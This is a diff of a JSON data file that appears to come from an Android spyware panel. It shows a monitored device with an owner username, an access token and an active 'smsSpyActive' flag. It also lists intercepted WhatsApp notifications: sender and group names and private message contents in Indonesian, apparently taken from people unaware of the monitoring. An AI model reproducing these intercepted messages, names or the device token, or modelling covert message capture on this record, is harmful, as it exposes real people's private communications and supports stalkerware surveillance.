@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776914569995,
+    "lastSeen": 1776914588113,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎63 pesan dari 40 chat",
+        "time": "23/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914590417
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "kamu enak banget dapet susu tiap hari",
+        "time": "23/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914590315
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 05:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1776891973345
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 37 chat",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891973330
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎60 pesan dari 38 chat",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891973036
       }
     ],
     "galleryPhotos": [],
@@ -9969,6 +9969,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎204 pesan dari 4 chat",
+        "time": "23/04 11:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914572095
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (13 pesan): ~ ROSMINI",
+        "content": "Menggaji",
+        "time": "23/04 11:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914572081
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
